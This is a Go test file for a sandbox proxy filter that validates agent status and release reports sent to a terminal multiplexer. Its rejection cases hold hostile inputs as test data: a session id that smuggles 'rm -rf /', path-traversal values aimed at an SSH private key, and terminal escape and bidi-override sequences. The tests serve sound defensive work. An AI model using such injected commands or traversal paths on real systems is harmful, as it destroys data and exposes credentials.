func piStateLine(t *testing.T, overrides map[string]any) string {
	t.Helper()
	return agentReportLine(t, methodPaneReportAgent, map[string]any{
		"pane_id":            "pane7",
		"source":             "herdr:pi",
		"agent":              "pi",
		"state":              "working",
		"message":            "calling the model",
		"seq":                int64(1753188469123456789),
		"agent_session_path": piSessionsDir + "/" + piSessionID + ".jsonl",
	}, overrides)
}

func piReleaseLine(t *testing.T, overrides map[string]any) string {
	t.Helper()
	return agentReportLine(t, methodPaneReleaseAgent, map[string]any{
		"pane_id": "pane7",
		"source":  "herdr:pi",
		"agent":   "pi",
		"seq":     int64(1753188469123456790),
	}, overrides)
}

func TestDecidePaneReportAgentAllowsEveryPermittedState(t *testing.T) {
	f := piReportFilter(t)

	for _, state := range reportAgentStates {
		t.Run(state, func(t *testing.T) {
			d := f.Decide([]byte(piStateLine(t, map[string]any{"state": state})))
			if !d.Allow {
				t.Fatalf("Decide denied state %q: %s", state, d.Reason)
			}
			if d.Rewritten != nil {
				t.Errorf("report was rewritten to %s, want the original bytes forwarded", d.Rewritten)
			}
		})
	}
}

// TestDecidePaneReportAgentAllowsCapturedPiLine runs the byte-exact shape the
// installed Pi v5 integration sends, and pins that it reaches herdr unchanged.
func TestDecidePaneReportAgentAllowsCapturedPiLine(t *testing.T) {
	const line = `{"id":"herdr:pi:1753188469123:9k2b1x","method":"pane.report_agent",` +
		`"params":{"pane_id":"pane7","source":"herdr:pi","agent":"pi","state":"blocked",` +
		`"message":"provider returned error (429)","seq":1753188469123456789,` +
		`"agent_session_path":"/home/user/.pi/agent/sessions/01J8Z5K3Q7RN4V2XW9B6TDHFAC.jsonl"}}`

	d := piReportFilter(t).Decide([]byte(line))
	if !d.Allow {
		t.Fatalf("Decide denied the captured Pi report: %s", d.Reason)
	}
	if d.Rewritten != nil {
		t.Errorf("report was rewritten to %s, want the original bytes forwarded", d.Rewritten)
	}
}

// TestDecidePaneReportAgentAllowsMinimalReport covers the transition Pi sends
// before it knows a session ref: state and anchors only.
func TestDecidePaneReportAgentAllowsMinimalReport(t *testing.T) {
	d := piReportFilter(t).Decide([]byte(piStateLine(t, map[string]any{
		"agent_session_path": nil,
		"message":            nil,
		"seq":                nil,
	})))
	if !d.Allow {
		t.Fatalf("Decide denied a state-only report: %s", d.Reason)
	}
}

// TestDecidePaneReportAgentAllowsSessionIDRef covers the other half of Pi's
// withSessionRef: an id instead of a path.
func TestDecidePaneReportAgentAllowsSessionIDRef(t *testing.T) {
	d := piReportFilter(t).Decide([]byte(piStateLine(t, map[string]any{
		"agent_session_path": nil,
		"agent_session_id":   piSessionID,
	})))
	if !d.Allow {
		t.Fatalf("Decide denied an id-ref state report: %s", d.Reason)
	}
}

// The control-character check bounds what a terminal acts on, not the charset:
// a status message is user-facing text and a provider may well localize it, so
// ordinary non-ASCII must keep passing.
func TestDecidePaneReportAgentAllowsNonASCIIMessage(t *testing.T) {
	for _, msg := range []string{
		"attente de l'utilisateur",
		"待機中",
		"ждём ответа",
		"waiting — 3 tools queued",
	} {
		d := piReportFilter(t).Decide([]byte(piStateLine(t, map[string]any{"message": msg})))
		if !d.Allow {
			t.Errorf("Decide denied message %q: %s", msg, d.Reason)
		}
	}
}

func TestDecidePaneReportAgentRejections(t *testing.T) {
	tests := []struct {
		name      string
		cfg       *FilterConfig
		overrides map[string]any
		wantIn    string
	}{
		{
			name:      "wrong pane",
			overrides: map[string]any{"pane_id": "pane9"},
			wantIn:    "is not this sandbox's pane",
		},
		{
			name:   "empty current pane id",
			cfg:    &FilterConfig{Capabilities: []Capability{CapAgentReporting}, ExpectedAgent: "pi"},
			wantIn: "no current pane id configured",
		},
		{
			name:   "empty expected agent",
			cfg:    &FilterConfig{Capabilities: []Capability{CapAgentReporting}, CurrentPaneID: "pane7"},
			wantIn: "no launched agent configured",
		},
		{
			name:      "wrong agent",
			overrides: map[string]any{"agent": "claude", "source": "herdr:claude"},
			wantIn:    "is not the launched agent",
		},
		{
			name:      "wrong source",
			overrides: map[string]any{"source": "herdr:claude"},
			wantIn:    `source "herdr:claude" is not "herdr:pi"`,
		},
		{
			name:      "unknown field",
			overrides: map[string]any{"resume_command": "pi --session x"},
			wantIn:    "unknown field",
		},
		{
			name:      "non-integer seq",
			overrides: map[string]any{"seq": "1753188469123456789"},
			wantIn:    "invalid params",
		},
		{
			name:      "negative seq",
			overrides: map[string]any{"seq": int64(-1)},
			wantIn:    "seq is negative",
		},
		{
			name:      "missing state",
			overrides: map[string]any{"state": nil},
			wantIn:    "is not one of",
		},
		{
			name:      "empty state",
			overrides: map[string]any{"state": ""},
			wantIn:    "is not one of",
		},
		{
			// herdr's own enum decodes this fourth variant; no shipped
			// integration sends it, so the proxy does not pass it through.
			name:      "unknown state",
			overrides: map[string]any{"state": "unknown"},
			wantIn:    "is not one of",
		},
		{
			name:      "invented state",
			overrides: map[string]any{"state": "compromised"},
			wantIn:    "is not one of",
		},
		{
			name:      "non-string state",
			overrides: map[string]any{"state": 3},
			wantIn:    "invalid params",
		},
		{
			name:      "oversized message",
			overrides: map[string]any{"message": strings.Repeat("a", maxLabelBytes+1)},
			wantIn:    "message exceeds the length limit",
		},
		{
			name:      "message with a newline",
			overrides: map[string]any{"message": "provider error\nstack trace"},
			wantIn:    "message contains a control character",
		},
		{
			name:      "message with an escape sequence",
			overrides: map[string]any{"message": "clean\x1b[2Joverwritten"},
			wantIn:    "message contains a control character",
		},
		{
			name:      "message with a NUL",
			overrides: map[string]any{"message": "trunc\x00ated"},
			wantIn:    "message contains a control character",
		},
		{
			// U+009B is CSI, the single-byte form of "ESC [". A byte-wise scan
			// for < 0x20 never sees it: UTF-8 encodes it as 0xC2 0x9B, so both
			// bytes read as ordinary text while the terminal still acts on it.
			name:      "message with a C1 control sequence introducer",
			overrides: map[string]any{"message": "clean\u009b2Joverwritten"},
			wantIn:    "message contains a control character",
		},
		{
			name:      "message with a C1 next-line",
			overrides: map[string]any{"message": "provider error\u0085stack trace"},
			wantIn:    "message contains a control character",
		},
		{
			// A bidi override reverses how the rest of the label renders, so a
			// one-line status can be made to read as something it is not.
			name:      "message with a bidi override",
			overrides: map[string]any{"message": "idle\u202egnikrow"},
			wantIn:    "message contains a control character",
		},
		{
			name:      "message with a zero-width space",
			overrides: map[string]any{"message": "blo\u200bcked"},
			wantIn:    "message contains a control character",
		},
		{
			name:      "session id with a metacharacter",
			overrides: map[string]any{"agent_session_path": nil, "agent_session_id": "abc;rm -rf /"},
			wantIn:    "agent_session_id is not a permitted token",
		},
		{
			name:      "session id starting with a hyphen",
			overrides: map[string]any{"agent_session_path": nil, "agent_session_id": "-session"},
			wantIn:    "agent_session_id is not a permitted token",
		},
		{
			name:      "session path outside the agent's session directory",
			overrides: map[string]any{"agent_session_path": "/home/user/.ssh/id_ed25519"},
			wantIn:    "outside the launched agent's session directory",
		},
		{
			name:      "session path with a .. component",
			overrides: map[string]any{"agent_session_path": piSessionsDir + "/../../.ssh/id_ed25519"},
			wantIn:    `agent_session_path contains a ".." component`,
		},
		{
			name:      "relative session path",
			overrides: map[string]any{"agent_session_path": "sessions/" + piSessionID + ".jsonl"},
			wantIn:    "agent_session_path is not absolute",
		},
		{
			name: "empty agent session directory",
			cfg: &FilterConfig{
				Capabilities:  []Capability{CapAgentReporting},
				CurrentPaneID: "pane7",
				ExpectedAgent: "pi",
			},
			wantIn: "no agent session directory configured",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := piReportFilter(t)
			if tc.cfg != nil {
				f = NewFilter(*tc.cfg)
			}

			d := f.Decide([]byte(piStateLine(t, tc.overrides)))
			if d.Allow {
				t.Fatalf("Decide allowed %s: %s", tc.name, d.Reason)
			}
			if !strings.Contains(d.Reason, tc.wantIn) {
				t.Errorf("reason = %q, want it to contain %q", d.Reason, tc.wantIn)
			}
		})
	}
}

// TestDecidePaneReportAgentReasonsOmitSecrets keeps the two sandbox-controlled
// strings out of the log: the session ref, and the free-text message, which is
// a provider error that can quote a path or a prompt.
func TestDecidePaneReportAgentReasonsOmitSecrets(t *testing.T) {
	const secret = "abcd1234secretsession"

	cases := []map[string]any{
		{"pane_id": "pane9"},
		{"agent": "claude", "source": "herdr:claude"},
		{"state": "compromised"},
		{"seq": int64(-1)},
		{"agent_session_path": "/etc/" + secret + ".jsonl"},
		{"agent_session_path": piSessionsDir + "/../" + secret + ".jsonl"},
		{"agent_session_path": nil, "agent_session_id": secret + ";id"},
		{"message": secret + "\n"},
	}

	f := piReportFilter(t)
	for _, overrides := range cases {
		all := map[string]any{"message": "leaked " + secret}
		maps.Copy(all, overrides)
		d := f.Decide([]byte(piStateLine(t, all)))
		if d.Allow {
			t.Fatalf("Decide allowed %v", overrides)
		}
		if strings.Contains(d.Reason, secret) {
			t.Errorf("reason %q leaks a sandbox-controlled value", d.Reason)
		}
	}
}

func TestDecidePaneReleaseAgentAllowsOwnPaneAndAgent(t *testing.T) {
	d := piReportFilter(t).Decide([]byte(piReleaseLine(t, nil)))
	if !d.Allow {
		t.Fatalf("Decide denied a valid release: %s", d.Reason)
	}
	if d.Rewritten != nil {
		t.Errorf("release was rewritten to %s, want the original bytes forwarded", d.Rewritten)
	}
}

func TestDecidePaneReleaseAgentRejections(t *testing.T) {
	tests := []struct {
		name      string
		cfg       *FilterConfig
		overrides map[string]any
		wantIn    string
	}{
		{
			name:      "wrong pane",
			overrides: map[string]any{"pane_id": "pane9"},
			wantIn:    "is not this sandbox's pane",
		},
		{
			name:   "empty current pane id",
			cfg:    &FilterConfig{Capabilities: []Capability{CapAgentReporting}, ExpectedAgent: "pi"},
			wantIn: "no current pane id configured",
		},
		{
			name:   "empty expected agent",
			cfg:    &FilterConfig{Capabilities: []Capability{CapAgentReporting}, CurrentPaneID: "pane7"},
			wantIn: "no launched agent configured",
		},
		{
			name:      "wrong agent",
			overrides: map[string]any{"agent": "claude", "source": "herdr:claude"},
			wantIn:    "is not the launched agent",
		},
		{
			name:      "wrong source",
			overrides: map[string]any{"source": "herdr:claude"},
			wantIn:    `source "herdr:claude" is not "herdr:pi"`,
		},
		{
			// release carries no payload; a state field is not it riding along.
			name:      "unknown field",
			overrides: map[string]any{"state": "idle"},
			wantIn:    "unknown field",
		},
		{
			name:      "session ref riding along",
			overrides: map[string]any{"agent_session_id": piSessionID},
			wantIn:    "unknown field",
		},
		{
			name:      "negative seq",
			overrides: map[string]any{"seq": int64(-1)},
			wantIn:    "seq is negative",
		},
		{
			name:      "non-integer seq",
			overrides: map[string]any{"seq": 1.5},
			wantIn:    "invalid params",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := piReportFilter(t)
			if tc.cfg != nil {
				f = NewFilter(*tc.cfg)
			}

			d := f.Decide([]byte(piReleaseLine(t, tc.overrides)))
			if d.Allow {
				t.Fatalf("Decide allowed %s: %s", tc.name, d.Reason)
			}
			if !strings.Contains(d.Reason, tc.wantIn) {
				t.Errorf("reason = %q, want it to contain %q", d.Reason, tc.wantIn)
			}
		})
	}
}

// TestDecideLifecycleMethodsNeedCapability pins that the anchors alone do not
// open either method, and that the other capabilities do not reach them.
func TestDecideLifecycleMethodsNeedCapability(t *testing.T) {
	for _, caps := range [][]Capability{nil, {CapNotify, CapLaunchOverlay}} {
		f := NewFilter(FilterConfig{
			Capabilities:    caps,
			CurrentPaneID:   "pane7",
			ExpectedAgent:   "pi",
			AgentSessionDir: piSessionsDir,
		})

		for _, line := range []string{piStateLine(t, nil), piReleaseLine(t, nil)} {
			d := f.Decide([]byte(line))
			if d.Allow {
				t.Fatalf("Decide allowed %s without CapAgentReporting: %s", d.Method, d.Reason)
			}
			if !strings.Contains(d.Reason, "not permitted by the enabled capabilities") {
				t.Errorf("reason = %q, want the deny-by-default text", d.Reason)
			}
		}
	}
}

// TestClaudeConfiguredFilterDeniesPiLifecycleReports is the cross-agent guard:
// enabling the capability for one agent does not let a report claim another.
func TestClaudeConfiguredFilterDeniesPiLifecycleReports(t *testing.T) {
	f := sessionReportFilter(t)

	for _, line := range []string{piStateLine(t, nil), piReleaseLine(t, nil)} {
		d := f.Decide([]byte(line))
		if d.Allow {
			t.Fatalf("Decide allowed a pi %s under a claude-configured filter", d.Method)
		}
		if !strings.Contains(d.Reason, "is not the launched agent") {
			t.Errorf("reason = %q, want the agent anchor rule", d.Reason)
		}
	}
}
